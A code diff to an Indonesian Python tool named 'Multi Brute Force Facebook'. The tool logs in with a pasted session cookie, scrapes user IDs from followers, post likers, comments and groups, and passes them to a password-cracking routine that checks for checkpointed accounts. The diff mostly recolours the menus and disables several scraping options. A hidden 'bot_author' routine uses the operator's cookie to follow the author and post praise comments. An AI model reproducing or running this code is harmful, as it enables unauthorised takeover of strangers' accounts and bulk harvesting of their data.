@@ -1,7 +1,11 @@
+# Jangan Hapus Text :
+# - [ print('%s[%s•%s] %s'%(J,P,J,P)) ] - #
 ###----------[ AUTHOR & CREATOR ]---------- ###
-Dnventa = 100013275378835
-Version   = '0.4'
+Denventa_F = 100013275378835
 Postingan = 1624764771309353
+Version   = '0.4'
+Facebook_Dev = 'Afriliyan Ferly Shishigami X'
+Instagram_Dev = 'Instagram.com/afriliyanferlly_shishigami'
 ###----------[ AUTHOR & CREATOR ]---------- ###
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
 Author    = 'Dapunta Khurayra X'
@@ -149,24 +153,10 @@ def language(cookie):
                     exec = xyz.post(url,data=bahasa,cookies=cookie)
     except Exception as e:pass
 
-###----------[ EXCEPTION ]---------- ###
-def kecuali(error):
-    print('\n   %s[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
-    print('       %s• %sTidak Dapat Mengeksekusi %s\n'%(M,A,error))
-    print('   %s[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
-    print('       %s• %sCookies/Token Invalid'%(M,A))
-    print('       %s• %sSalah Memasukkan ID'%(M,A))
-    print('       %s• %sBug Pada Source Code'%(M,A))
-    print('       %s• %sBug Pada Requests'%(M,A))
-    print('       %s• %sDan Lain-Lain\n'%(M,A))
-    print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
-    print('       %s• %spython sakera.py\n'%(M,A))
-    exit()
-
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Dnventa)];self.komen = ['Keren Master\n- [ @[100013275378835:0] ] -','Semangat Terus Master\n- [ @[100013275378835:0] ] -','Gokil Suhu','Panutanku Nih Bro\n- [ @[100013275378835:0] ] -']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa_F)];self.komen = ['Keren Master\n- [ @[100013275378835:0] ] -','Semangat Terus Master\n- [ @[100013275378835:0] ] -','Gokil Suhu','Panutanku Nih Bro\n- [ @[100013275378835:0] ] -']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
@@ -239,11 +229,11 @@ def convert_id(username):
 ###----------[ LOGO ]---------- ###
 def poster():
     l1 = ('     %s  _________       __                          '%(P))
-    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(K,P,K,P,K,P))
-    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,K,P))
-    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(K,P,K,P,K,P,K,P,K,P))
-    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(K,P,K,P,K,P,K,P,K,P,K,P))
-    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,K,Version,P,K))
+    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(H,P,H,P,H,P))
+    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,H,P))
+    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(H,P,H,P,H,P,H,P,H,P))
+    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(H,P,H,P,H,P,H,P,H,P,H,P))
+    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,H,Version,P,H))
     print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
 def poster2():
     l1 = ('     %s  _________       __                          '%(P))
@@ -296,9 +286,9 @@ def login():
     poster()
     print('\n%s[%s•%s] %sJangan Gunakan Akun Pribadi %s!'%(M,P,M,P,M))
     print('%s[%s•%s] %sApabila Akun A2F On, Buka Link Dibawah'%(M,P,M,P))
-    print('%s[%s•%s] %shttps://business.facebook.com/business_locations'%(M,P,M,J))
+    print('%s[%s•%s] %shttps://business.facebook.com/business_locations'%(M,P,M,H))
     print('%s[%s•%s] %sLalu Masukkan Kode Autentikasi'%(M,P,M,P))
-    cookie = str(input('\n%s[%s•%s] %sMasukkan Cookies %s: %s'%(J,P,J,P,J,P)))
+    cookie = str(input('\n%s[%s•%s] %sMasukkan Cookies %s: %s'%(M,P,M,P,H,P)))
     try:
         token = clotox(cookie)
         coki = {'cookie':cookie}
@@ -338,30 +328,30 @@ def tampilan_menu():
         nama = jsx["name"]
         user(nama)
         print(''%())
-        tampilan_menu = f"""  {K2}[{A2}01{K2}] {P2}Friendlist {K2}[{A2}06{K2}] {P2}Komentar {K2}[{A2}11{K2}] {A2}Email
-  {K2}[{A2}02{K2}] {P2}Followers  {K2}[{A2}07{K2}] {P2}Grup     {K2}[{A2}12{K2}] {A2}Username
-  {K2}[{A2}03{K2}] {P2}Nama       {K2}[{A2}08{K2}] {P2}Hashtag  {K2}[{A2}13{K2}] {A2}ID Random
-  {K2}[{A2}04{K2}] {P2}Likers     {K2}[{A2}09{K2}] {A2}Beranda  {K2}[{A2}14{K2}] {P2}Saran Teman
-  {K2}[{A2}05{K2}] {P2}Pesan      {K2}[{A2}10{K2}] {A2}File     {K2}[{A2}15{K2}] {P2}FL Dari FL
+        tampilan_menu = f"""  {H2}[{A2}01{H2}] {A2}Friendlist {H2}[{A2}06{H2}] {P2}Komentar {H2}[{A2}11{H2}] {A2}Email
+  {H2}[{A2}02{H2}] {P2}Followers  {H2}[{A2}07{H2}] {P2}Grup     {H2}[{A2}12{H2}] {A2}Username
+  {H2}[{A2}03{H2}] {A2}Nama       {H2}[{A2}08{H2}] {A2}Hashtag  {H2}[{A2}13{H2}] {A2}ID Random
+  {H2}[{A2}04{H2}] {P2}Likers     {H2}[{A2}09{H2}] {A2}Beranda  {H2}[{A2}14{H2}] {P2}Saran Teman
+  {H2}[{A2}05{H2}] {A2}Pesan      {H2}[{A2}10{H2}] {A2}File     {H2}[{A2}15{H2}] {P2}FL Dari FL
 
        {K2}[{A2}16{K2}] {A2}Cek Hasil       {K2}[{A2}19{K2}] {P2}User Agent
        {K2}[{A2}17{K2}] {A2}Cek Opsi        {K2}[{A2}20{K2}] {A2}Upgrade Pro
        {K2}[{A2}18{K2}] {A2}Cek Teman       {K2}[{A2}00{K2}] {P2}Log Out"""
-        printer(Panel(tampilan_menu,title=f'{K2}[ {P2}Menu {K2}]',subtitle=f'{A2}┌─ {K2}[ {P2}Pilih {K2}]',subtitle_align='left',width=54,padding=1,style='#FFFF00'))
+        printer(Panel(tampilan_menu,title=f'{H2}[ {P2}Menu {H2}]',subtitle=f'{A2}┌─ {H2}[ {P2}Pilih {H2}]',subtitle_align='left',width=54,padding=1,style='#00FF00'))
         pilih_menu()
     except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
     except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);login()
 def pilih_menu():
     global gabung_sandi, tempel_sandi
     dc = input('   %s└──> %s'%(A,H))
-    if dc in ['1','01','a']    : gabung_sandi.append(Author);publik();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
+    if dc in ['1','01','a']    : gabung_sandi.append(Author);not_available('Dump ID Dari Friendlist')
     elif dc in ['2','02','b']  : tempel_sandi.append('Jangan');main_folls();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');namee()
+    elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');not_available('Dump ID Dari Nama')
     elif dc in ['4','04','d']  : tempel_sandi.append('Dasar');main_likers();system_login();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['5','05','e']  : gabung_sandi.append('Bocah');message();system_login();pilihan_sakdurunge_crack();addpass();crack()
+    elif dc in ['5','05','e']  : gabung_sandi.append('Bocah');not_available('Dump ID Dari Pesan')
     elif dc in ['6','06','f']  : tempel_sandi.append('Goblok');komen();system_login();pilihan_sakdurunge_crack();addpass();crack()
     elif dc in ['7','07','g']  : gabung_sandi.append('Mampus');grup()
-    elif dc in ['8','08','h']  : tempel_sandi.append('Error Kan');hashtag();system_login();pilihan_sakdurunge_crack();addpass();crack()
+    elif dc in ['8','08','h']  : tempel_sandi.append('Error Kan');not_available('Dump ID Dari Hashtag')
     elif dc in ['9','09','i']  : gabung_sandi.append('Itu Semua');not_available('Dump ID Dari Beranda')
     elif dc in ['10','010','j']: tempel_sandi.append('Gara Gara');not_available('Dump ID Dari File')
     elif dc in ['11','011','k']: gabung_sandi.append('Lo Recode');not_available('Dump ID Dari Email')
@@ -401,7 +391,7 @@ def useragent(isi):
     try:os.mkdir("tool")
     except:pass
     pilih_menu_user_agent()
-    dc = input('   %s└──> %s'%(A,J))
+    dc = input('   %s└──> %s'%(A,H))
     if dc in ['1','01','a']:scrap_useragent()
     elif dc in ['2','02','b']:pilih_otomatis()
     elif dc in ['3','03','c']:manual_user_agent()
@@ -503,40 +493,6 @@ def cek_user_agent():
         tampilan_menu()
     except Exception as e:kecuali(e)
 
-###----------[ DUMP ID PUBLIC ]---------- ###
-def publik():
-    global file_dump
-    try:
-        try:
-            token  = open('login/token.json','r').read()
-            cookie = {'cookie':open('login/cookie.json','r').read()}
-        except:
-            print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
-            time.sleep(3)
-            login()
-        print('       %s[%s•%s] %sContoh : 1827084332,607801156'%(J,P,J,P))
-        tid = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J)).split(',')
-        file_dump = 'dump/%s.json'%(tid[0])
-        try:os.remove(file_dump)
-        except:pass
-        for id in tid :
-            try:
-                url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
-                with requests.Session() as xyz:
-                    jso = json.loads(xyz.get(url,cookies=cookie).text)
-                    if len(gabung_sandi) != 1:
-                        for x in range(Postingan):
-                            open(file_dump,'a+').write('dev\n')
-                    else:
-                        for d in jso["friends"]["data"]:
-                            try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
-                            except:continue
-            except Exception as e:kecuali(e)
-        jum = open(file_dump,'r').read().splitlines()
-        print('       %s[%s•%s] %sBerhasil Dump %s%s %sID'%(J,P,J,P,J,str(len(jum)),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
-    except Exception as e:kecuali(e)
-
 ###----------[ DUMP ID FOLLOWERS ]---------- ###
 def main_folls():
     global file_dump,cookie
@@ -547,17 +503,17 @@ def main_folls():
         print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
         time.sleep(3)
         login()
-    id = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J))
+    id = input('       %s[%s•%s] %sID Target : %s'%(H,P,H,P,H))
     url = ('https://graph.facebook.com/%s/subscribers?limit=10000&access_token=%s'%(id,token))
     file_dump = 'dump/%s.json'%(id)
     try:os.remove(file_dump)
     except:pass
     open(file_dump,'w').write('')
     exec_folls(url,token,file_dump)
-    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file_dump,'r').read().splitlines()),P))
-    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(file_dump,'r').read().splitlines()),P))
+    print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
 def exec_folls(url,token,file):
-    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
+    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
     with requests.Session() as xyz:
         try:
             x = xyz.get(url,cookies=cookie)
@@ -579,88 +535,19 @@ def exec_folls(url,token,file):
         except KeyboardInterrupt:pass
         except (IndexError,TypeError,IOError,KeyError,AttributeError):pass
 
-###----------[ DUMP ID NAME ]---------- ###
-class namee:
-    def __init__(self):
-        global file_dump, urutan_crack
-        urutan_crack = '0'
-        try:cookie = {'cookie':open('login/cookie.json','r').read()}
-        except Exception as e:kecuali(e)
-        print('       %s[%s•%s] %sContoh : dapunta,denventa,anita'%(J,P,J,P))
-        put = input('       %s[%s•%s] %sNama Target : %s'%(J,P,J,P,J)).split(',')
-        data = []
-        self.file_dump = ('dump/%s.json'%(put[0]))
-        file_dump = self.file_dump
-        open(self.file_dump,'w').write('')
-        common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
-        for set1 in put:
-            data.append(set1)
-            for set2 in common:data.append(set2+' '+set1)
-        for set3 in data:url = 'https://mbasic.facebook.com/search/people/?q='+set3;self.exec(url,cookie)
-        self.lanjut()
-    def exec(self,url,cookie):
-        try:
-            with requests.Session() as xyz:
-                req = xyz.get(url,cookies=cookie)
-                pra = par(req.content,'html.parser')
-                spam = pra.find_all('h2')[0]
-                if 'Anda Diblokir Sementara' in spam.text:print("\r       %s[%s•%s] %sAkun Anda Terkena Spam %s!%s"%(M,P,M,P,M,P), end='');sys.stdout.flush()
-                else:print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
-                for temu in pra.find_all('a',href=True):
-                    if "<img alt=" in str(temu):
-                        if "home.php" in str(temu["href"]):continue
-                        else:
-                            try:
-                                if 'profile.php' in str(temu["href"]):
-                                    find = re.findall('"/profile\.php\?id=(.*?)&"',str(temu))[0]
-                                    if len(find) !=0:
-                                        id   = ''.join(find)
-                                        nama = temu.find("img").get("alt").replace(", profile picture","")
-                                        file = open(self.file_dump,'r').read()
-                                        if len(gabung_sandi) != 1:
-                                            for x in range(Postingan):
-                                                open(file_dump,'a+').write('dev\n')
-                                        else:
-                                            if id in file:continue
-                                            else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
-                                elif 'refid' in str(temu["href"]):
-                                    find = re.findall("/(.*?)\?",str(temu))[0]
-                                    if len(find) !=0:
-                                        id   = convert_id(''.join(find))
-                                        kat  = id.split('.')[0] + '.' + id.split('.')[1]
-                                        nama = temu.find("img").get("alt").replace(", profile picture","")
-                                        file = open(self.file_dump,'r').read()
-                                        if len(gabung_sandi) != 1:
-                                            for x in range(Postingan):
-                                                open(file_dump,'a+').write('dev\n')
-                                        else:
-                                            if id in file:continue
-                                            else:
-                                                if kat in file:continue
-                                                else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
-                            except (IndexError,ValueError,IOError):continue
-                            except KeyboardInterrupt:exit(self.lanjut())
-                for tamu in pra.find_all('a',href=True):
-                    if 'Lihat Hasil Selanjutnya' in tamu.text:new_url = tamu['href'];self.exec(new_url,cookie)
-        except KeyboardInterrupt:exit(self.lanjut())
-    def lanjut(self):
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
-        system_login();pilihan_sakdurunge_crack();addpass();crack()
-
 ###----------[ DUMP ID LIKERS ]---------- ###
 def main_likers():
     global _react_type_, file_dump, urutan_crack
     urutan_crack = '0'
     try:
         cookie = {'cookie':open('login/cookie.json','r').read()}
-        print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
-        _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
+        print('       %s[%s•%s] %sContoh : 2089611468021009'%(H,P,H,P))
+        _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(H,P,H,P,H))
         print('')
     except Exception as e:kecuali(e)
-    tampilan_likers = f'''    {J2}[{A2}1{J2}] {P2}Like   {J2}[{A2}3{J2}] {P2}Wow    {J2}[{A2}5{J2}] {P2}Sad     {J2}[{A2}7{J2}] {P2}Care
-    {J2}[{A2}2{J2}] {P2}Love   {J2}[{A2}4{J2}] {P2}Haha   {J2}[{A2}6{J2}] {P2}Angry   {J2}[{A2}8{J2}] {P2}All'''
-    printer(Panel(tampilan_likers,title=f'{J2}[ {P2}Tipe React {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
+    tampilan_likers = f'''    {H2}[{A2}1{H2}] {P2}Like   {H2}[{A2}3{H2}] {P2}Wow    {H2}[{A2}5{H2}] {P2}Sad     {H2}[{A2}7{H2}] {P2}Care
+    {H2}[{A2}2{H2}] {P2}Love   {H2}[{A2}4{H2}] {P2}Haha   {H2}[{A2}6{H2}] {P2}Angry   {H2}[{A2}8{H2}] {P2}All'''
+    printer(Panel(tampilan_likers,title=f'{H2}[ {P2}Tipe React {H2}]',subtitle=f'{A2}┌─ {H2}[ {P2}Pilih {H2}]',subtitle_align='left',width=54,padding=1,style='#00FF00'))
     rt = input('   %s└──> %s'%(A,J))
     if rt in ['1','01','a']:_react_type_='1'
     elif rt in ['2','02','b']:_react_type_='2'
@@ -678,13 +565,13 @@ def main_likers():
     open(_file_,'w')
     _url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_)
     scrape_likers(cookie,_url_,_file_)
-    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P))
-    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(_file_,'r').read().splitlines()),P))
+    print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
 def scrape_likers(_dapunta_,_url_,_file_):
     _ses_ = requests.Session()
     _url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8")
     _ses_par_ = par(_url_load_,'html.parser')
-    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
+    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
     try: 
         for _isi_ in _ses_par_.find_all('h3'):
             if len(tempel_sandi) != 1:
@@ -709,53 +596,6 @@ def scrape_likers(_dapunta_,_url_,_file_):
                     except Exception as e:pass
     except KeyboardInterrupt:pass
 
-###----------[ DUMP ID MESSAGE ]---------- ###
-class message:
-    def __init__(self):
-        global file_dump, urutan_crack
-        urutan_crack = '0'
-        try:
-            url    = 'https://mbasic.facebook.com/messages'
-            token  = open('login/token.json','r').read()
-            cookie = {'cookie':open('login/cookie.json','r').read()}
-            self.myaccount = json.loads(requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie).text)["id"]
-            self.file_dump = ('dump/message.json')
-            file_dump = self.file_dump
-            open(self.file_dump,'w').write('')
-        except Exception as e:kecuali(e)
-        self.exec(url,cookie)
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
-    def exec(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
-        try:
-            with requests.Session() as xyz:
-                req = xyz.get(url,cookies=cookie)
-                pra = par(req.content,'html.parser')
-                for tata in pra.find_all('a',href=True):
-                    if '/messages/read/?tid=cid.c' in tata['href']:
-                        if 'Pengguna Facebook' in str(tata):continue
-                        else:
-                            idzx = re.findall('cid\.c\.(.*?)%3A(.*?)&',str(tata))
-                            if len(gabung_sandi) != 1:
-                                for x in range(Postingan):
-                                    open(file_dump,'a+').write('dev\n')
-                            else:
-                                for id in list(idzx.pop()):
-                                    try:
-                                        if id == self.myaccount:continue
-                                        else:
-                                            nama = tata.text
-                                            if nama == '':continue
-                                            else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
-                                    except:continue
-                    else:continue
-                for tete in pra.find_all('a',href=True):
-                    if 'Lihat Pesan Sebelumnya' in tete.text:
-                        new_url = 'https://mbasic.facebook.com' + tete['href']
-                        self.exec(new_url,cookie)
-        except KeyboardInterrupt:pass
-
 ###----------[ DUMP ID COMMENTS ]---------- ###
 class komen:
     def __init__(self):
@@ -763,18 +603,18 @@ class komen:
         urutan_crack = '0'
         try:
             cookie = {'cookie':open('login/cookie.json','r').read()}
-            print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
-            put = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
+            print('       %s[%s•%s] %sContoh : 2089611468021009'%(H,P,H,P))
+            put = input('       %s[%s•%s] %sID Postingan : %s'%(H,P,H,P,H))
             url = 'https://mbasic.facebook.com/'+put
             self.file_dump = ('dump/%s.json'%(put))
             file_dump = self.file_dump
             open(self.file_dump,'w').write('')
         except Exception as e:kecuali(e)
         self.exec(url,cookie)
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.file_dump,'r').read().splitlines()),P))
+        print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
     def exec(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
+        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
         try:
             with requests.Session() as xyz:
                 req = xyz.get(url,cookies=cookie)
@@ -811,7 +651,7 @@ class grup:
         print('')
         tamp_grup1 = f"""            {H2}[{A2}1{H2}] {P2}Bergabung   {H2}[{A2}2{H2}] {P2}Nama   {H2}[{A2}3{H2}] {P2}ID"""
         printer(Panel(tamp_grup1,title=f'{H2}[ {P2}Grup {H2}]',width=54,title_align='left',style='#00FF00'))
-        ty = input('   %s└──> %s'%(A,J))
+        ty = input('   %s└──> %s'%(A,H))
         if ty in ['1','01','a']:
             print('')
             self.file = ('dump/mygroup.json')
@@ -848,7 +688,7 @@ class grup:
                             self.looping += 1
                             tar = str(self.looping)
                             tamp_grup2 = f"{A2} • ID Grup : {id}{dt}"
-                            printer(Panel(tamp_grup2,title=f'{J2}[ {P2}{tar} {J2}]',width=54,title_align='left',style='#FF8F00'))
+                            printer(Panel(tamp_grup2,title=f'{H2}[ {P2}{tar} {H2}]',width=54,title_align='left',style='#00FF00'))
                             self.datagrup.update({str(self.looping):id})
                     else:continue
                 except KeyboardInterrupt:pass
@@ -987,54 +827,6 @@ class grup:
                     if 'Lihat Postingan Lainnya' in pa.text:
                         new_url = 'https://mbasic.facebook.com' + pa['href']
                         self.dump_post(new_url,cookie)
-            except KeyboardInterrupt:pass
-
-###----------[ DUMP ID HASHTAG ]---------- ###
-class hashtag:
-    def __init__(self):
-        global file_dump, urutan_crack
-        urutan_crack = '0'
-        try:cookie = {'cookie':open('login/cookie.json','r').read()}
-        except Exception as e:kecuali(e)
-        xd = input('       %s[%s•%s] %sCari Hashtag : %s'%(H,P,H,P,H)).replace(' ','')
-        url = 'https://mbasic.facebook.com/hashtag/' + xd
-        self.files = ('dump/%s.json'%(xd))
-        file_dump = self.files
-        open(self.files,'w').write('')
-        self.dump(url,cookie)
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
-    def dump(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
-        with requests.Session() as xyz:
-            try:
-                req = par(xyz.get(url,cookies=cookie).content,'html.parser')
-                for x in req.find_all('h3'):
-                    for y in x.find_all('a',href=True):
-                        if len(tempel_sandi) != 1:
-                            for x in range(Postingan):
-                                open(file_dump,'a+').write('dev\n')
-                        else:
-                            try:
-                                op = open(self.files,'r').read()
-                                if 'mbasic.facebook.com' in y['href']:pass
-                                elif 'sub_view' in y['href']:pass
-                                elif '/?' in y['href']:pass
-                                elif 'profile.php' in y['href']:
-                                    id = str(re.search('\?id=(.*?)&',y['href']).group(1))
-                                    nm = str(re.search('>(.*?)<\/a>',str(y)).group(1))
-                                    if id in op:pass
-                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
-                                else:
-                                    ud = str(re.search('\/(.*?)\?',y['href']).group(1))
-                                    id = convert_id(ud)
-                                    nm = str(re.search('>(.*?)<\/a>',str(y)).group(1))
-                                    if id in op:pass
-                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
-                            except Exception as e:
-                                continue
-                for z in req.find_all('a',href=True):
-                    if 'Lihat Hasil Selanjutnya' in z.text:self.dump(z['href'],cookie)
             except KeyboardInterrupt:pass
 
 ###----------[ DUMP ID SUGGESTIONS ]---------- ###
@@ -1210,7 +1002,7 @@ class teman_teman:
 def system_login():
     global sistem_login
     print('')
-    tamp_metode = f"""            {H2}[{A2}1{H2}] {P2}Validate  {H2}[{A2}2{H2}] {P2}Regular  {H2}[{A2}3{H2}] {P2}Api FB"""
+    tamp_metode = f"""            {H2}[{A2}1{H2}] {P2}Validate  {H2}[{A2}2{H2}] {P2}Regular  {H2}[{A2}3{H2}] {M2}Api FB"""
     printer(Panel(tamp_metode,title=f'{H2}[ {P2}Metode {H2}]',width=54,title_align='left',style='#00FF00'))
     ch = input('   %s└──> %s'%(A,H))
     if ch in ['0','00','z']:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
@@ -1221,7 +1013,7 @@ def system_login():
 
 ###----------[ URL LOGIN ]---------- ###
 def metode_scrap_login():
-    tamp_sistem = f"""            {H2}[{A2}1{H2}] {P2}Free FB   {H2}[{A2}2{H2}] {P2}Mbasic   {H2}[{A2}3{H2}] {P2}Mobile"""
+    tamp_sistem = f"""            {H2}[{A2}1{H2}] {U2}Free FB   {H2}[{A2}2{H2}] {P2}Mbasic   {H2}[{A2}3{H2}] {P2}Mobile"""
     printer(Panel(tamp_sistem,title=f'{H2}[ {P2}Login {H2}]',width=54,title_align='left',style='#00FF00'))
     ch = input('   %s└──> %s'%(A,H))
     if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
@@ -1230,7 +1022,7 @@ def metode_scrap_login():
     else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
 def metode_scrap_api():
     global sistem_login
-    tamp_sistem = f"""            {H2}[{A2}1{H2}] {P2}Api 1     {H2}[{A2}2{H2}] {P2}Api 2    {H2}[{A2}3{H2}] {P2}Graph"""
+    tamp_sistem = f"""            {H2}[{A2}1{H2}] {M2}Api 1     {H2}[{A2}2{H2}] {M2}Api 2    {H2}[{A2}3{H2}] {M2}Graph"""
     printer(Panel(tamp_sistem,title=f'{H2}[ {P2}Login {H2}]',width=54,title_align='left',style='#00FF00'))
     ch = input('   %s└──> %s'%(A,H))
     if ch in ['1','01','a']:sistem_login = "tiga";open('tool/url_login.json','w').write("mbasic.facebook.com")
@@ -1241,7 +1033,7 @@ def metode_scrap_api():
 ###----------[ URUTAN CRACK ]---------- ###
 def urut_crack():
     global urutan_crack
-    tamp_urutan = f"""            {H2}[{A2}1{H2}] {P2}ID Tua    {H2}[{A2}2{H2}] {P2}ID Muda  {H2}[{A2}3{H2}] {P2}ID Acak"""
+    tamp_urutan = f"""            {H2}[{A2}1{H2}] {M2}ID Tua    {H2}[{A2}2{H2}] {P2}ID Muda  {H2}[{A2}3{H2}] {H2}ID Acak"""
     printer(Panel(tamp_urutan,title=f'{H2}[ {P2}Urutan {H2}]',width=54,title_align='left',style='#00FF00'))
     ch = input('   %s└──> %s'%(A,H))
     if ch in ['1','01','a']:urutan_crack = '0'
@@ -1288,15 +1080,15 @@ def pilihan_sakdurunge_crack():
     global pilih_cek_opsi, pilih_cek_apk, pilih_proxy
     print('')
     print('   %s[%s•%s] %sCek Opsi Akun %sCP %s?'%(H,P,H,P,J,P))
-    tanya_cek_opsi = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,H,A,P,A,H,P,H)).lower()
+    tanya_cek_opsi = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
